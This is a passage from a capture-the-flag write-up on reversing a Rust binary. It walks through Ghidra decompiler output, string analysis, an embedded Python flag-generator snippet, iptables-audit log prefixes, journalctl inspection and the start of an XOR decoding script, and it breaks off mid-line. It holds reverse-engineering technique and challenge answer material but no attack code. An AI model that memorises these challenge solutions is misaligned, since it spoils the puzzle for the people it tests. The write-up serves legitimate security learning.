{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            lVar11 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> DAT_0017fb08;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> DAT_0017fb08;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">          }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">          DAT_0017fb08 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">          UNLOCK\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        } \u003C/span>\u003Cspan style=\"color:#F97583\">while\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (bVar19);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">long\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(in_FS_OFFSET \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#79B8FF\">8\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar9;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      DAT_0017fac0 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar9;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">      FUN_0010f340\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(FUN_0010fec0);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">      if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (DAT_0017fa08 \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 3\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">goto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> LAB_00112aa3;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">      goto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> LAB_00112a10;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    local_110 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    local_68 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    local_118 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> pthread_attr_getstack\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">local_108,\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">local_110,\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">local_68);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    pvVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> local_110;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (local_118 \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">goto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> LAB_00112aea;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    local_114 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> pthread_attr_destroy\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">local_108);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (local_114 \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">      if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (uVar8 \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        FUN_001079d0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">PTR_s_library\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">std\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">src\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">sys\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">pal\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">unix\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">sta_0017e168);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        goto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> LAB_00112b42;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">      if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (((ulong)pvVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">|\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> uVar8) \u003C/span>\u003Cspan style=\"color:#F97583\">>>\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">20\u003C/span>\u003Cspan style=\"color:#F97583\"> ==\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        uVar15 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ((ulong)pvVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffff\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">%\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (uVar8 \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffff\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">      else\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        uVar15 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (ulong)pvVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">%\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> uVar8;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      lVar9 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> uVar8 \u003C/span>\u003Cspan style=\"color:#F97583\">-\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> uVar15;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">      if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (uVar15 \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        lVar9 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      ppVar6 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (pollfd \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((\u003C/span>\u003Cspan style=\"color:#F97583\">long\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)pvVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar9);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      pcVar18 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (code \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((\u003C/span>\u003Cspan style=\"color:#F97583\">long\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)ppVar6 \u003C/span>\u003Cspan style=\"color:#F97583\">-\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> uVar8);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">      goto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> LAB_00112832;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    ppuVar16 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">PTR_s_library\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">std\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">src\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">sys\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">pal\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">unix\u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\">sta_0017e138;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    piVar17 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">local_114;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#FFAB70\">  local_60\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">  FUN_0010e47f\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(piVar17,local_60,ppuVar16);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">LAB_00112b42:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">                    /* WARNING: Does not return */\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  pcVar18 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (code \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#B392F0\">invalidInstructionException\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  (\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">pcVar18)();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This decompiled function is the program startup/initializer, not the user main. The pseudocode shows classic runtime and platform setup: it calls poll/fcntl/open64 to check/initialize file descriptors, installs signal handlers (sigaction / signal), calls sysconf and pthread_getattr_np to query thread and stack info, initializes libc/Rust runtime structures, sets up thread-local data, and invokes runtime callbacks (functions like FUN_0010f340, FUN_0010fec0, FUN_0010e5c0, etc.). The many DAT_00… globals are runtime state and library pointers (e.g., pointers to Rust std internals). Warnings like Type propagation algorithm not settling and the undefined8 return type are Ghidra’s decompiler telling you it could not precisely infer high-level types common in compiler-optimized startup code : (\u003C/p>\n\u003Cp>Another useful step in reverse engineering, especially when the decompiled code looks noisy or unclear, is to inspect the strings embedded in the binary. Strings often reveal crucial hints about program logic, such as messages printed to the console, function names, file paths, or even the flag format\u003C/p>\n\u003Cp>Looking at the strings we see a hint to the flag\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/havok-engine-reverse-engineering/image-13.png\" alt=\"Strings analysis showing flag hint\">\u003C/p>\n\u003Cp>Lets  move onto the looking at the flag functions .\u003C/p>\n\u003Cp>We see a function that has something called flag_generator and in the huge dissass we see PTR_s_Execution_finished._0017baf8 . So this might be the main logic handling of the binary .\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/havok-engine-reverse-engineering/image-14.png\" alt=\"Flag generator function\">\u003C/p>\n\u003Cp>ALsooo investigating the huge dump we find , a function call to FUN_00113590 included a long embedded string containing a complete Python script. The script defines a function named generate_flag_part(seed), which takes an integer seed, converts it to bytes, computes its SHA-256 hash, and returns the first eight hexadecimal characters of the resulting digest. This pattern suggests that the binary relies on Python code execution to dynamically produce a portion of the final flag\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">  FUN_00113590\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#FFAB70\">local_248\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">               \"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">import base64\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">import hashlib\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">def generate_flag_part(seed: int) -> str:\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#79B8FF\"> \\n\u003C/span>\u003Cspan style=\"color:#79B8FF\">   \\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">    seed_bytes = str(seed).encode(\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\'\u003C/span>\u003Cspan style=\"color:#9ECBFF\">utf-8\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\'\u003C/span>\u003Cspan style=\"color:#9ECBFF\">)\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">    hashed_seed = hashlib.sha256(seed _bytes).hexdigest()\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#79B8FF\">    \\n\u003C/span>\u003Cspan style=\"color:#79B8FF\">   \\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">    flag_part = hashed_seed[:8]\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#79B8FF\">    \\n\u003C/span>\u003Cspan style=\"color:#79B8FF\">    \\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">    retu rn flag_part\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">               ,\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">fa\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Investigating more through this huge rust dump we get ,\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                             s_[iptables-audit]_DENY-EVENT-DATA_0016d000     XREF[\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]:     0017bad8(*)  \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        0016d000 5b \u003C/span>\u003Cspan style=\"color:#79B8FF\">69\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 70\u003C/span>\u003Cspan style=\"color:#79B8FF\">        ds\u003C/span>\u003Cspan style=\"color:#E1E4E8\">         \"[iptables-audit] DENY-EVENT-\u003C/span>\u003Cspan style=\"color:#B392F0\">DATA:\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> \"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">                 74\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 61\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 62\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                 6c \u003C/span>\u003Cspan style=\"color:#79B8FF\">65\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 73\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                             s_[iptables-audit]_DENY-EVENT-\u003C/span>\u003Cspan style=\"color:#B392F0\">KEY:\u003C/span>\u003Cspan style=\"color:#E1E4E8\">_0016d022     XREF[\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]:     0017bae8(*)  \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        0016d022 5b \u003C/span>\u003Cspan style=\"color:#79B8FF\">69\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 70\u003C/span>\u003Cspan style=\"color:#79B8FF\">        ds\u003C/span>\u003Cspan style=\"color:#E1E4E8\">         \"[iptables-audit] DENY-EVENT-\u003C/span>\u003Cspan style=\"color:#B392F0\">KEY:\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> \"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">                 74\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 61\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 62\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                 6c \u003C/span>\u003Cspan style=\"color:#79B8FF\">65\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 73\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                             s_rust_vm_poc_0016d043                          XREF[\u003C/span>\u003Cspan style=\"color:#79B8FF\">6\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]:     \u003C/span>\u003Cspan style=\"color:#B392F0\">FUN_0010fec0:\u003C/span>\u003Cspan style=\"color:#E1E4E8\">00111b3e(*), \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                                                                                          FUN_0010fec0:\u003C/span>\u003Cspan style=\"color:#E1E4E8\">00111b45(*), \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                                                                                          FUN_0010fec0:\u003C/span>\u003Cspan style=\"color:#E1E4E8\">00111b8e(*), \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                                                                                          FUN_0010fec0:\u003C/span>\u003Cspan style=\"color:#E1E4E8\">00111c24(*), \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                                                                                          FUN_0010fec0:\u003C/span>\u003Cspan style=\"color:#E1E4E8\">00111c2b(*), \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                                                                                          FUN_0010fec0:\u003C/span>\u003Cspan style=\"color:#E1E4E8\">00111c74(*)  \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        0016d043 \u003C/span>\u003Cspan style=\"color:#79B8FF\">72\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 75\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 73\u003C/span>\u003Cspan style=\"color:#79B8FF\">        ds\u003C/span>\u003Cspan style=\"color:#E1E4E8\">         \"rust_vm_poc\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">                 74\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> 5f \u003C/span>\u003Cspan style=\"color:#79B8FF\">76\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">                 6d\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> 5f \u003C/span>\u003Cspan style=\"color:#79B8FF\">70\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                             s_Execution_finished._0016d04e                  XREF[\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]:     0017baf8(*)  \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        0016d04e \u003C/span>\u003Cspan style=\"color:#79B8FF\">45\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 78\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 65\u003C/span>\u003Cspan style=\"color:#79B8FF\">        ds\u003C/span>\u003Cspan style=\"color:#E1E4E8\">         \"Execution finished.\\n\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">                 63\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 75\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 74\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">                 69\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> 6f 6e \u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cimg src=\"/images/posts/havok-engine-reverse-engineering/image-15.png\" alt=\"iptables-audit strings\">\u003C/p>\n\u003Cp>The “[iptables-audit] DENY-EVENT-DATA: ” string is part of a static message table that FUN_0010fec0 uses to log results. Because the same codebase embeds a Python snippet that computes generate_flag_part(seed) and also contains the “Execution finished.” message, the evidence indicates the program executes the Python/VM code and then logs its output using these prefixes. By tracing references from the pointer table into FUN_0010fec0 and inspecting the buffer written by the Python runner (the &#x26;local_248 passed to FUN_00113590), we can capture the generated segments and reconstruct the full flag also :) it provides the keyword, iptables-audit, needed to find the messages. Second, the presence of separate DATA and KEY fields is a massive hint that the flag is encrypted\u003C/p>\n\u003Cp>Lets turn to analysing the system logs now  .\u003C/p>\n\u003Cp>journalctl is a command-line utility used on Linux systems that use systemd. It reads and displays logs that are collected by the systemd journal, which is the central logging system for systemd-managed systems.\u003C/p>\n\u003Cp>Unlike traditional text logs (/var/log/syslog, /var/log/messages), the journal stores logs in a binary format, allowing structured queries, filtering, and metadata access. It includes not only messages from the kernel and services, but also stdout/stderr of systemd services\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/havok-engine-reverse-engineering/image-16.png\" alt=\"journalctl output\">\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">import\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> base64\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">import\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> binascii\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">encrypted_data_hex \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"722e7e207155\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">key_hex \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"aff543c352c2\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># Decode, XOR, and 